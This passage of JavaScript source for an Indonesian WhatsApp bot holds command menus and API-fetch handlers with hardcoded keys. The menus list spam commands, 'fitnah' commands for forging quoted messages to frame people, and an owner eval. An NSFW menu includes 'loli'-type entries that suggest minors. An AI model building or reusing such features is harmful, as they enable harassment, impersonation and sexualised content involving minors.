冬 ${prefix}maker2d [ _text_ ]
冬 ${prefix}epepserti [ _text_ ]
│
☬─❲ GROUP ❳─☬ツ
☬ ${prefix}getpict [ _@tag_ ]
☬ ${prefix}getname [ _reply target_ ]
☬ ${prefix}getbio [ _reply target_ ]
☬ ${prefix}promote [ _@tag_ ]
☬ ${prefix}demote [ _@tag_ ]
☬ ${prefix}antilink [ _on/off_ ]
☬ ${prefix}antivirtex [ _on/off_ ]
☬ ${prefix}antiwame [ _on/off_ ]
☬ ${prefix}antibug [ _on/off_ ]
☬ ${prefix} welcome [ _on/off_ ]
☬ ${prefix}creategrup [ _nama|@tag_ ]
☬ ${prefix}tictactoe [ _@tag_ ]
☬ ${prefix}delttt
☬ ${prefix}getpp
☬ ${prefix}antiwame
☬ ${prefix}getdeskgc
☬ ${prefix}sider [ _reply pesan bot_ ]
☬ ${prefix}hacked [ _teks_ ]
☬ ${prefix}setnamegc [ _teks_ ]
☬ ${prefix}setdeskgc [ _teks_ ]
☬ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
☬ ${prefix}kontak [ _@tag|nama_ ]
☬ ${prefix}kontag [ _@tag|nama_ ]
☬ ${prefix}opengc
☬ ${prefix}closegc
☬ ${prefix}resetlinkgc
☬ ${prefix}linkgrup
☬ ${prefix}hidetag [ _teks_ ]
☬ ${prefix}sticktag [ _nama sticker_ ]
☬ ${prefix}totag [ _reply media_ ]
│
☬─❲ STICKER ❳─☬ツ
☬ ${prefix}sticker
☬ ${prefix}stickerwm [ _nama|author_ ]
☬ ${prefix}takestick [ _nama|author_ ]
☬ ${prefix}colong [ _reply sticker_ ]
☬ ${prefix}dadu
☬ ${prefix}semoji [ _emoji_ ]
☬ ${prefix}attp [ _teks_ ]
☬ ${prefix}ttp [ _teks_ ]
☬ ${prefix}ttp2 [ _teks_ ]
☬ ${prefix}ttp3 [ _teks_ ]
☬ ${prefix}ttp4 [ _teks_ ]
☬ ${prefix}toimg
☬ ${prefix}tomp3 [ _reply video_ ]
☬ ${prefix}tomp4 [ _reply sticker gif_ ]
☬ ${prefix}robot [ _reply audio_ ]
☬ ${prefix}balik [ _reply audio_ ]
☬ ${prefix}bass [ _reply audio_ ]
☬ ${prefix}gemuk [ _reply audio_ ]
☬ ${prefix}detikvn [ _reply audio caption angka_ ]
☬ ${prefix}detikvideo [ _reply video caption angka_ ]
│
☬─❲ ASUPAN ❳─☬ツ
☬ ${prefix}asupan
☬ ${prefix}asupan2
☬ ${prefix}asupant3
│
☬─❲ WIBU ❳─☬ツ
冬 ${prefix}loli
冬 ${prefix}husbu
冬 ${prefix}milf
冬 ${prefix}cosplay
冬 ${prefix}wallml
│
☬─❲ STORAGE ❳─☬ツ
☬ ${prefix}listimage
☬ ${prefix}liststicker
☬ ${prefix}listvn
☬ ${prefix}addsticker [ _nama_ ]
☬ ${prefix}delsticker [ _nama_ ]
☬ ${prefix}addvn [ _nama_ ]
☬ ${prefix}delvn [ _nama_ ]
☬ ${prefix}addimage [ _nama_ ]
☬ ${prefix}delimage [ _nama_ ]
│
☬─❲ JADI BOT ❳─☬ツ
☬ ${prefix}stopjadibot
☬ ${prefix}jadibot
│
☬─❲ MENU HARAM ❳─☬ツ
冬 ${prefix}bokep
冬 ${prefix}neko
冬 ${prefix}kanna
冬 ${prefix}sagiri
冬 ${prefix}megumin
冬 ${prefix}wallnime
冬 ${prefix}ass
冬 ${prefix}ahegao
冬 ${prefix}hentai
冬 ${prefix}yuri
冬 ${prefix}panties
冬 ${prefix}neko2
冬 ${prefix}chiisaihentai
冬 ${prefix}trap
冬 ${prefix}blowjob
冬 ${prefix}yaoi
冬 ${prefix}ecchi
冬 ${prefix}ahegao
冬 ${prefix}hololewd
冬 ${prefix}sideoppai
冬 ${prefix}animefeets
冬 ${prefix}animebooty
冬 ${prefix}animethighss
冬 ${prefix}hentaiparadise
冬 ${prefix}animearmpits
冬 ${prefix}hentaifemdom
冬 ${prefix}lewdanimegirls
冬 ${prefix}biganimetiddies
冬 ${prefix}animebellybutton
冬 ${prefix}hentai4everyone
冬 ${prefix}bj
冬 ${prefix}ero
冬 ${prefix}cum
冬 ${prefix}feet
冬 ${prefix}yuri2
冬 ${prefix}trap
冬 ${prefix}lewd
冬 ${prefix}feed
冬 ${prefix}eron
冬 ${prefix}solo
冬 ${prefix}gasm
冬 ${prefix}poke
冬 ${prefix}anal
冬 ${prefix}holo
冬 ${prefix}tits
冬 ${prefix}kuni
冬 ${prefix}kiss
冬 ${prefix}erok
冬 ${prefix}smug
冬 ${prefix}baka
冬 ${prefix}solog
冬 ${prefix}feetg
冬 ${prefix}lewdk
冬 ${prefix}waifu
冬 ${prefix}pussy
冬 ${prefix}femdom
冬 ${prefix}cuddle
冬 ${prefix}eroyuri
冬 ${prefix}cum_jpg
冬 ${prefix}blowjob
冬 ${prefix}erofeet
冬 ${prefix}holoero
冬 ${prefix}classic
冬 ${prefix}erokemo
冬 ${prefix}fox_girl
冬 ${prefix}futanari
冬 ${prefix}lewdkemo
冬 ${prefix}wallpaper
冬 ${prefix}pussy_jpg
冬 ${prefix}kemonomimi
冬 ${prefix}nsfw_avatar
│
☬─❲ EVAL ❳─☬ツ
☬ *x*
☬ *>*
☬ *=>*
☬ *$*
│
☬─❲ NGEMEME ❳─☬ツ
☬ ${prefix}meme
☬ ${prefix}darkjokes
│
☬─❲ OTHER/FUN ❳─☬ツ
☬ ${prefix}quotes
☬ ${prefix}rate
☬ ${prefix}kapankah
☬ ${prefix}apakah
☬ ${prefix}bisakah
☬ ${prefix}caripesan [ _teks|jumlah_ ]
☬ ${prefix}slots
☬ ${prefix}suit [ _gunting/batu/kertas_ ]
☬ ${prefix}tag [ _nomor_ ]
☬ ${prefix}tagme
☬ ${prefix}tts [ _kodebhs teks_ ]
☬ ${prefix}readmore [ _teks1|teks2_ ]
☬ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
☬ ${prefix}chat [ _nomor|teks_ ]
☬ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
☬ ${prefix}listgrup
☬ ${prefix}baileys [ _reply message_ ]
☬ ${prefix}q [ _reply message_ ]
☬ ${prefix}getcaption [ _reply message_ ]
☬ ${prefix}pantun
☬ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]
☬ ${prefix}sharelock [ _teks1|teks2_ ]
└─⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱
`
if(menuall == false){
   //Masih langka
anu = kurr.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
								"productImage": {
								 "url": "https://mmg.whatsapp.net/d/f/ArOK6JYC4LIwG8IBSkzANX_lRn3GDBkeOfu0zeaZGlZS.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "QdTrU3VfgJNttQrHT/tvbwew7S4nSMQcbPLQFKS8qyw=",
						"fileLength": "44077",
						"height": 640,
						"width": 640,
						"mediaKey": "ibMQBV88k/jdyv2p4VSN1x/pymsWU3vjULCynKcHfzc=",
						"fileEncSha256": "Oi/vUfezzCvb6mL+oAL2aN8SFhwEZqsjC2qewV3tIzA=",
						"jpegThumbnail": fs.readFileSync('./media/thumb.jpg')
                                },
                            "productId": "4626894507357122",
							"title": `${nama}`, 
							"description": `${menunya}`,
							"retailerId": `🇲🇨⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗🇲🇨`,
							"productImageCount": 1
						},
						"businessOwnerJid": `${ownerJid}`,
						"contextInfo": {
							"forwardingScore": 9999,
							"isForwarded": true
						}
					}
				},{quoted: ftrol, contextInfo: { mentionedJid: [dtod,otod,stod]}})
                  kurr.relayWAMessage(anu)
                  } else if(menuall = true){
gbutsan = [
{buttonId:`owner`,buttonText:{displayText:'🛐OWNER🛐'},type:1},
{buttonId:`donasi`,buttonText:{displayText:'💗DONASI💗'},type:1},
]
mhan = await kurr.prepareMessage(from, pporigi, image, {thumbnail: pporigi})
const btnBngsat = {
imageMessage: mhan.message.imageMessage,
contentText: `${menunya}`,
footerText: `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,
buttons: gbutsan,
headerType: 4
}
kurr.sendMessage(from, btnBngsat, MessageType.buttonsMessage, { quoted: ftrol, caption: menunya, contextInfo: { mentionedJid: [dtod,otod,stod]}})
                  }
break
        case 'ig':
        reply('https://instagram.com/quotes.thenay_\nFOLOW BANG')
        break
case 'verify':
if (isRegistered) return sticOk(from)
const serialUser = createSerial(18)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const jancok = `╭─❒ 「 Verify 」 ❒
🇲🇨 *🇲🇨 Nama :* ${pushname}
🇲🇨 *🇲🇨 Nomor :* @${sender.split('@')[0]}
🇲🇨 *🇲🇨 Seri:* ${serialUser}
🇲🇨 *🇲🇨 Pengguna:* ${_registered.length}
└❏

*「 ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗ 」*`
gbutsan = [
{buttonId:`menu`,buttonText:{displayText:'MENU'},type:1},
{buttonId:`donasi`,buttonText:{displayText:'SEDEKAH'},type:1}
]
mhan = await kurr.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Terimakasih Sudah Mendaftar\n*_© ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*', 
buttons: gbutsan,
headerType: 4
}
kurr.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
        break
case 'command':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
 stod = `${sender}`
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
 description: `Hai kak @${stod.split('@')[0]}, Silahkan pilih menu disini`,
 sections: [
                     {
                      "title": `${jmn} - ${week} ${weton} - ${calender}`,
 rows: [
                           {
                              "title": "Speed",
                              "rowId": ""
                           },
                           {
                              "title": "Status",
                              "rowId": ""
                           },
                           {
                              "title": "Creator",
                              "rowId": ""
                           },
                           {
                              "title": "Jadibot",
                              "rowId": ""
                           },
                           {
                              "title": "Runtime",
                              "rowId": ""
                           },
                           {
                              "title": "OwnerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "MakerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "GroupMenu",
                              "rowId": ""
                           },
                           {
                              "title": "WibuMenu",
                              "rowId": ""
                           },
                           {
                              "title": "OtherMenu",
                              "rowId": ""
                           },
                           {
                              "title": "MenuHaram",
                              "rowId": ""
                           },
                           {
                              "title": "DownloadMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
kurr.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
case 'ownermenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
🏴‍☠️─❒ OWNER
🏴‍☠️ ${prefix}autorespon [ _on/off_ ]
🏴‍☠️ ${prefix}antidelete [ _on/off_ ]
🏴‍☠️ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
🏴‍☠️ ${prefix}tobc [ _reply sticker/audio with caption_ ]
🏴‍☠️ ${prefix}return [ _javascript_ ]
🏴‍☠️ ${prefix}clearall
🏴‍☠️ ${prefix}delchat
🏴‍☠️ ${prefix}mute
🏴‍☠️ ${prefix}unmute
🏴‍☠️ ${prefix}public
🏴‍☠️ ${prefix}self
🏴‍☠️ ${prefix}spam [ _teks|jumlah_ ]
🏴‍☠️ ${prefix}demoteall
🏴‍☠️ ${prefix}promoteall
🏴‍☠️ ${prefix}addcmd [ _teks reply stc_ ]
🏴‍☠️ ${prefix}delcmd [ _reply stc_ ]
🏴‍☠️ ${prefix}listcmd
🏴‍☠️ ${prefix}spamsw [ _teks|jumlah_ ]
🏴‍☠️ ${prefix}upswteks [ _teks_ ]
🏴‍☠️ ${prefix}upswlokasi [ _teks_ ]
🏴‍☠️ ${prefix}upswaudio [ _reply audio_ ]
🏴‍☠️ ${prefix}upswvoice [ _reply audio_ ]
🏴‍☠️ ${prefix}upswsticker [ _reply sticker_ ]
🏴‍☠️ ${prefix}upswimage [ _reply image with caption_ ]
🏴‍☠️ ${prefix}upswgif [ _reply gif with caption_ ]
🏴‍☠️ ${prefix}upswvideo [ _reply video with caption_ ]
🏴‍☠️ ${prefix}shutdown
🏴‍☠️ ${prefix}offline [ _alasan_ ]
🏴‍☠️ ${prefix}online
🏴‍☠️ ${prefix}exif [ _nama|author_ ]
🏴‍☠️ ${prefix}setprofile [ _reply image_ ]
🏴‍☠️ ${prefix}setname [ _teks_ ]
🏴‍☠️ ${prefix}setprefix [ _multi/nopref/prefix_ ]
🏴‍☠️ ${prefix}setbio [ _teks_ ]
🏴‍☠️ ${prefix}leave
🏴‍☠️ ${prefix}restart
🏴‍☠️ ${prefix}addrespon [ _tanya|jawab_ ]
🏴‍☠️ ${prefix}delrespon [ _nama_ ]
🏴‍☠️ ${prefix}listrespon
🏴‍☠️ ${prefix}readall
🏴‍☠️ ${prefix}unreadall
🏴‍☠️ ${prefix}archive
🏴‍☠️ ${prefix}unarchiveall
🏴‍☠️ ${prefix}pin
🏴‍☠️ ${prefix}unpin
🏴‍☠️ ${prefix}setmenu [ _ori/simpel_ ]
🏴‍☠️ ${prefix}setallmenu [ _ori/simpel_ ]
??‍☠️ ${prefix}leavetime [ _detik/menit/jam_ ]
🏴‍☠️ ${prefix}bukatime [ _detik/menit/jam_ ]
🏴‍☠️ ${prefix}tutuptime [ _detik/menit/jam_ ]
🏴‍☠️ ${prefix}nano [ _nama file_ ]`
katalog(menu)
break
case 'downloadmenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU DOWNLOAD\`\`\` 」
🏴‍☠️────────────────────
🏴‍☠️ ${prefix}infogempa
🏴‍☠️ ${prefix}herolist
🏴‍☠️ ${prefix}herodetail [ _hero_ ]
🏴‍☠️ ${prefix}google [ _search_ ]
🏴‍☠️ ${prefix}gimage [ _search_ ]
🏴‍☠️ ${prefix}wiki [ _search_ ]
🏴‍☠️ ${prefix}mediafire [ _link_ ]
🏴‍☠️ ${prefix}ytsearch [ _judul_ ]
🏴‍☠️ ${prefix}ytmp4 [ _link yt_ ]
🏴‍☠️ ${prefix}ytmp3 [ _link yt_ ]
🏴‍☠️ ${prefix}play [ _judul lagu_ ]
🏴‍☠️ ${prefix}video [ _judul video_ ]
🏴‍☠️ ${prefix}tinyurl [ _link_ ]
🏴‍☠️ ${prefix}fetch [ _link_ ]
🏴‍☠️ ${prefix}igdl [ _link_ ]
🏴‍☠️ ${prefix}tiktokdl [ _link_ ]
🏴‍☠️ ${prefix}pinterest [ _search_ ]
🏴‍☠️ ${prefix}lirik [ _judul_ ]
🏴‍☠️ ${prefix}tourl [ _reply image/video_ ]
🏴‍☠️ ${prefix}resepmasakan [ _judul_ ]
🏴‍☠️ ${prefix}artimimpi [ _teks_ ]
🏴‍☠️ ${prefix}bilangangka [ _angka_ ]
🏴‍☠️ ${prefix}kalkulator [ _angka_ ]
🏴‍☠️ ${prefix}fancytext [ _teks_ ]
🏴‍☠️ ${prefix}githubstalk [ _username_ ]
🏴‍☠️ ${prefix}translate [ _teks kodebhs_ ]
└ ${prefix}ss [ _link_ ]`
katalog(menu)
break
case 'makermenu':
menu = `❏ 「 \`\`\`MENU MAKER\`\`\` 」
─❒ MAKER
冬 ${prefix}blackpink
冬 ${prefix}neon
冬 ${prefix}greenneon
冬 ${prefix}advanceglow
冬 ${prefix}futureneon
冬 ${prefix}sandwriting
冬 ${prefix}sandsummer
冬 ${prefix}sandengraved
冬 ${prefix}metaldark
冬 ${prefix}neonlight
冬 ${prefix}holographic
冬 ${prefix}text1917
冬 ${prefix}minion
冬 ${prefix}deluxesilver
冬 ${prefix}newyearcard
冬 ${prefix}bloodfrosted
冬 ${prefix}halloween
冬 ${prefix}jokerlogo
冬 ${prefix}fireworksparkle
冬 ${prefix}natureleaves
冬 ${prefix}bokeh
冬 ${prefix}toxic
冬 ${prefix}strawberry
冬 ${prefix}box3d
冬 ${prefix}roadwarning
冬 ${prefix}breakwall
冬 ${prefix}icecold
冬 ${prefix}luxury
冬 ${prefix}cloud
冬 ${prefix}summersand
冬 ${prefix}horrorblood
冬 ${prefix}thunder
冬 ${prefix}pornhub
冬 ${prefix}glitch
冬 ${prefix}avenger
冬 ${prefix}space
冬 ${prefix}ninjalogo
冬 ${prefix}marvelstudio
冬 ${prefix}lionlogo
冬 ${prefix}wolflogo
冬 ${prefix}steel3d
冬 ${prefix}wallgravity
冬 ${prefix}shadow
冬 ${prefix}cup
冬 ${prefix}cup1
冬 ${prefix}romance
冬 ${prefix}smoke
冬 ${prefix}burnpaper
冬 ${prefix}lovemessage
冬 ${prefix}undergrass
冬 ${prefix}love
冬 ${prefix}coffe
冬 ${prefix}woodheart
冬 ${prefix}woodenboard
冬 ${prefix}summer3d
冬 ${prefix}wolfmetal
冬 ${prefix}nature3d
冬 ${prefix}underwater
冬 ${prefix}golderrose
冬 ${prefix}summernature
冬 ${prefix}letterleaves
冬 ${prefix}glowingneon
冬 ${prefix}fallleaves
冬 ${prefix}flamming
冬 ${prefix}harrypotter
冬 ${prefix}carvedwood
冬 ${prefix}arcade8bit
冬 ${prefix}battlefield4
冬 ${prefix}pubg
冬 ${prefix}wetglass
冬 ${prefix}multicolor3d
冬 ${prefix}watercolor
冬 ${prefix}luxurygold
冬 ${prefix}galaxywallpaper
冬 ${prefix}lighttext
冬 ${prefix}beautifulflower
冬 ${prefix}puppycute
冬 ${prefix}royaltext
冬 ${prefix}heartshaped
冬 ${prefix}birthdaycake
冬 ${prefix}galaxystyle
冬 ${prefix}hologram3d
冬 ${prefix}greenneon
冬 ${prefix}glossychrome
冬 ${prefix}greenbush
冬 ${prefix}metallogo
冬 ${prefix}noeltext
冬 ${prefix}glittergold
冬 ${prefix}textcake
冬 ${prefix}starsnight
冬 ${prefix}wooden3d
冬 ${prefix}textbyname
冬 ${prefix}writegalacy
冬 ${prefix}galaxybat
冬 ${prefix}snow3d
冬 ${prefix}birthdayday
冬 ${prefix}goldplaybutton
冬 ${prefix}silverplaybutton
冬 ${prefix}freefire
冬 ${prefix}foliokanan [ _text_ ]
冬 ${prefix}foliokiri [ _text_ ]
冬 ${prefix}nuliskanan [ _text_ ]
冬 ${prefix}nuliskiri [ _text_ ]
冬 ${prefix}maker3d [ _text_ ]
冬 ${prefix}maker2d [ _text_ ]
冬 ${prefix}epepserti [ _text_ ]`
katalog(menu)
break
case 'groupmenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU GROUP\`\`\` 」
🏴‍☠️──❒ GROUP
🏴‍☠️ ${prefix}getpict [ _@tag_ ]
🏴‍☠️ ${prefix}getname [ _reply target_ ]
🏴‍☠️ ${prefix}getbio [ _reply target_ ]
🏴‍☠️ ${prefix}promote [ _@tag_ ]
🏴‍☠️ ${prefix}demote [ _@tag_ ]
🏴‍☠️ ${prefix}antilink [ _on/off_ ]
🏴‍☠️ ${prefix}antivirtex [ _on/off_ ]
🏴‍☠️ ${prefix}antiwame [ _on/off_ ]
🏴‍☠️ ${prefix}antibug [ _on/off_ ]
🏴‍☠️ ${prefix} welcome [ _on/off_ ]
🏴‍☠️ ${prefix}creategrup [ _nama|@tag_ ]
🏴‍☠️ ${prefix}tictactoe [ _@tag_ ]
🏴‍☠️ ${prefix}delttt
🏴‍☠️ ${prefix}getpp
🏴‍☠️ ${prefix}antiwame
🏴‍☠️ ${prefix}getdeskgc
🏴‍☠️ ${prefix}sider [ _reply pesan bot_ ]
🏴‍☠️ ${prefix}hacked [ _teks_ ]
🏴‍☠️ ${prefix}setnamegc [ _teks_ ]
🏴‍☠️ ${prefix}setdeskgc [ _teks_ ]
🏴‍☠️ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
🏴‍☠️ ${prefix}kontak [ _@tag|nama_ ]
🏴‍☠️ ${prefix}kontag [ _@tag|nama_ ]
🏴‍☠️ ${prefix}opengc
🏴‍☠️ ${prefix}closegc
🏴‍☠️ ${prefix}resetlinkgc
🏴‍☠️ ${prefix}linkgrup
🏴‍☠️ ${prefix}hidetag [ _teks_ ]
🏴‍☠️ ${prefix}sticktag [ _nama sticker_ ]
🏴‍☠️ ${prefix}totag [ _reply media_ ]`
katalog(menu)
break
case 'othermenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU OTHER\`\`\` 」
🏴‍☠️────────────────────
🏴‍☠️ ${prefix}jadibot
🏴‍☠️ ${prefix}caripesan [ _teks|jumlah_ ]
🏴‍☠️ ${prefix}slots
🏴‍☠️ ${prefix}suit [ _gunting/batu/kertas_ ]
🏴‍☠️ ${prefix}tag [ _nomor_ ]
🏴‍☠️ ${prefix}tagme
🏴‍☠️ ${prefix}tts [ _kodebhs teks_ ]
🏴‍☠️ ${prefix}readmore [ _teks1|teks2_ ]
🏴‍☠️ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
🏴‍☠️ ${prefix}chat [ _nomor|teks_ ]
🏴‍☠️ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
🏴‍☠️ ${prefix}listimage
🏴‍☠️ ${prefix}liststicker
🏴‍☠️ ${prefix}listvn
🏴‍☠️ ${prefix}listgrup
🏴‍☠️ ${prefix}baileys [ _reply message_ ]
🏴‍☠️ ${prefix}q [ _reply message_ ]
🏴‍☠️ ${prefix}getcaption [ _reply message_ ]
🏴‍☠️ ${prefix}pantun
🏴‍☠️ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]
🏴‍☠️ ${prefix}sharelock [ _teks1|teks2_ ]
🏴‍☠️ ${prefix}sticker
🏴‍☠️ ${prefix}stickerwm [ _nama|author_ ]
🏴‍☠️ ${prefix}takestick [ _nama|author_ ]
🏴‍☠️ ${prefix}colong [ _reply sticker_ ]
🏴‍☠️ ${prefix}dadu
🏴‍☠️ ${prefix}semoji [ _emoji_ ]
🏴‍☠️ ${prefix}attp [ _teks_ ]
🏴‍☠️ ${prefix}ttp [ _teks_ ]
🏴‍☠️ ${prefix}ttp2 [ _teks_ ]
🏴‍☠️ ${prefix}ttp3 [ _teks_ ]
🏴‍☠️ ${prefix}ttp4 [ _teks_ ]
🏴‍☠️ ${prefix}toimg
🏴‍☠️ ${prefix}tomp3 [ _reply video_ ]
🏴‍☠️ ${prefix}tomp4 [ _reply sticker gif_ ]
🏴‍☠️ ${prefix}robot [ _reply audio_ ]
🏴‍☠️ ${prefix}balik [ _reply audio_ ]
🏴‍☠️ ${prefix}bass [ _reply audio_ ]
🏴‍☠️ ${prefix}gemuk [ _reply audio_ ]
🏴‍☠️ ${prefix}detikvn [ _reply audio caption angka_ ]
└ ${prefix}detikvideo [ _reply video caption angka_ ]`
katalog(menu)
break
case 'wibumenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`WIBU MENU\`\`\` 」
🏴‍☠️────────────────────
☬─❲ WIBU ❳─☬ツ
冬 ${prefix}loli
冬 ${prefix}husbu
冬 ${prefix}milf
冬 ${prefix}cosplay
冬 ${prefix}wallml`
katalog(menu)
break
case 'menuharam':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU HARAM\`\`\` 」
🏴‍☠️────────────────────
冬 ${prefix}bokep
冬 ${prefix}neko
冬 ${prefix}kanna
冬 ${prefix}sagiri
冬 ${prefix}megumin
冬 ${prefix}wallnime
冬 ${prefix}ass
冬 ${prefix}ahegao
冬 ${prefix}hentai
冬 ${prefix}yuri
冬 ${prefix}panties
冬 ${prefix}neko2
冬 ${prefix}chiisaihentai
冬 ${prefix}trap
冬 ${prefix}blowjob
冬 ${prefix}yaoi
冬 ${prefix}ecchi
冬 ${prefix}ahegao
冬 ${prefix}hololewd
冬 ${prefix}sideoppai
冬 ${prefix}animefeets
冬 ${prefix}animebooty
冬 ${prefix}animethighss
冬 ${prefix}hentaiparadise
冬 ${prefix}animearmpits
冬 ${prefix}hentaifemdom
冬 ${prefix}lewdanimegirls
冬 ${prefix}biganimetiddies
冬 ${prefix}animebellybutton
冬 ${prefix}hentai4everyone
冬 ${prefix}bj
冬 ${prefix}ero
冬 ${prefix}cum
冬 ${prefix}feet
冬 ${prefix}yuri2
冬 ${prefix}trap
冬 ${prefix}lewd
冬 ${prefix}feed
冬 ${prefix}eron
冬 ${prefix}solo
冬 ${prefix}gasm
冬 ${prefix}poke
冬 ${prefix}anal
冬 ${prefix}holo
冬 ${prefix}tits
冬 ${prefix}kuni
冬 ${prefix}kiss
冬 ${prefix}erok
冬 ${prefix}smug
冬 ${prefix}baka
冬 ${prefix}solog
冬 ${prefix}feetg
冬 ${prefix}lewdk
冬 ${prefix}waifu
冬 ${prefix}pussy
冬 ${prefix}femdom
冬 ${prefix}cuddle
冬 ${prefix}eroyuri
冬 ${prefix}cum_jpg
冬 ${prefix}blowjob
冬 ${prefix}erofeet
冬 ${prefix}holoero
冬 ${prefix}classic
冬 ${prefix}erokemo
冬 ${prefix}fox_girl
冬 ${prefix}futanari
冬 ${prefix}lewdkemo
冬 ${prefix}wallpaper
冬 ${prefix}pussy_jpg
冬 ${prefix}kemonomimi
冬 ${prefix}nsfw_avatar`
katalog(menu)
break
// BIAR GAK LUPA 
//LUPA
case 'nuliskiri':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
kurr.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
case 'nuliskanan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
kurr.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
case 'foliokanan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
kurr.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
case 'foliokiri':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
sticWait(from)
kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
kurr.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
case 'asupan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
sticWait(from)
asu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/asupan?apikey=hardianto`)
kurr.sendMessage(from, asu, video, { quoted: mek})
break
case 'asupan2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/asupan?apikey=${YuzApi}`)
ano = await getBuffer(anu.result.result)
kurr.sendMessage(from, ano, video, { quoted: mek})
break
case 'asupant3':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/asupan/tiktok?apikey=${YuzApi}`)
ano = await getBuffer(anu.result.url)
kurr.sendMessage(from, ano, video, { quoted: mek})
break
case 'hijaber': case 'santuy':
case 'ukty': case 'bocil': case 'ghea':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/asupan/${command}?apikey=${YuzApi}`)
ano = await getBuffer(anu.result.url)
kurr.sendMessage(from, ano, image, { quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
break
       case 'maker3d': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} ShinChan`)
					teksnya = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://xnxxapi.herokuapp.com/api/maker3d?text=${teksnya}&apikey=xnxx`)
					buffer1 = await getBuffer(anu.result.results)
					kurr.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./thumb.jpg')})
					break
					
					case 'maker2d': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} ShinChan`)
					teksnya = args.join(" ")
					sticWait(from)
					anu = await fetchJson(`https://xnxxapi.herokuapp.com/api/maker?text=${teksnya}&apikey=xnxx`)
